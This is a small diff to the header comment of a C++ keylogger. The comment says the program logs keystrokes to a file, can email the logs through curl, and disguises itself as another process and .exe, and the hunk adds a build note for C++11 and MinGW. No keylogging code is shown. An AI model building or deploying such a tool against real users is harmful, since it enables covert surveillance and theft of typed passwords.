@@ -13,6 +13,7 @@ simple c+ keylogger
 leave as is to save output to file
 uncomment curl to send to specified email
 specify process name and path to .exe which is going to be faked before compiling
+Use c++ 11 standard, compiled & tested with mingw
 Karol Szustakowski 2017
 */
 
